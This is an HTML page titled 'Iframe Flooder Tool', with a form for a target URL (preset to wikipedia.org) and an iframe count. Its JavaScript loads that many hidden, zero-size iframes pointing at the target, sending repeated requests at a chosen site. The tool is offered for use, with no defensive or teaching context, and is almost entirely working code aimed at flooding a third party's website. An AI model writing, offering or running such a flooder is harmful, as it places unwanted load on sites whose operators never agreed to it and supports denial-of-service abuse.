
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Iframe Flooder Tool</title>
  <link rel="icon" href="favicon.ico" type="image/x-icon">
  <style>
    body {
      font-family: 'Arial', sans-serif;
      padding: 20px;
      background: #f4f7fc;
      color: #333;
    }

    h1 {
      text-align: center;
      color: #4CAF50;
    }

    .container {
      max-width: 600px;
      margin: 0 auto;
      background: white;
      border-radius: 8px;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
      padding: 20px;
    }

    input, button {
      padding: 12px;
      width: 100%;
      margin: 10px 0;
      font-size: 16px;
      border-radius: 5px;
      border: 1px solid #ccc;
    }

    input:focus, button:focus {
      outline: none;
      border-color: #4CAF50;
    }

    button {
      background-color: #4CAF50;
      color: white;
      border: none;
      cursor: pointer;
    }

    button.stop {
      background-color: #f44336;
    }

    button:hover {
      opacity: 0.9;
    }

    .status {
      text-align: center;
      font-weight: bold;
      color: #4CAF50;
      margin-top: 20px;
    }

    #iframeContainer {
      display: none;
    }
  </style>
</head>
<body>

  <h1>Iframe Flooder Tool</h1>

  <div class="container">
    <label for="targetUrl">Target URL:</label>
    <input type="text" id="targetUrl" value="https://www.wikipedia.org">

    <label for="iframeCount">Number of Iframes:</label>
    <input type="number" id="iframeCount" value="50">

    <button onclick="startFlood()">Start Flooding</button>
    <button class="stop" onclick="stopFlood()">Stop Flooding</button>

    <div class="status" id="status">Ready</div>

    <div id="iframeContainer"></div>
  </div>

  <script>
    let flooding = false;

    function startFlood() {
      if (flooding) return;
      flooding = true;
      document.getElementById('status').innerText = "Flooding in progress...";

      const container = document.getElementById('iframeContainer');
      container.innerHTML = ""; // Clear any previous iframes

      const target = document.getElementById('targetUrl').value;
      const count = parseInt(document.getElementById('iframeCount').value);

      for (let i = 0; i < count; i++) {
        const iframe = document.createElement('iframe');
        iframe.src = target;
        iframe.style.width = "0";
        iframe.style.height = "0";
        iframe.style.border = "none";
        container.appendChild(iframe);
      }
    }

    function stopFlood() {
      flooding = false;
      document.getElementById('iframeContainer').innerHTML = "";
      document.getElementById('status').innerText = "Flooding stopped.";
    }
  </script>

</body>
</html>
